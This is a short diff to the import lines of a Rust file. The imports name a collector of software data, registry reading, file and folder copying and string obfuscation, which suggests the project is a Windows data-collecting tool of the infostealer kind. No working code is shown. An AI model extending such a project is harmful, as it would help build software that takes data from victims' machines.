@@ -1,9 +1,8 @@
 use crate::alloc::borrow::ToOwned;
-use alloc::vec::Vec;
 use collector::{Collector, Software};
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::{copy_content, copy_file, copy_folder, FileSystem};
+use filesystem::{copy_file, copy_folder, FileSystem};
 use obfstr::obfstr as s;
 use regedit::{read_registry_value, RegistryValue};
 use tasks::{parent_name, Task};
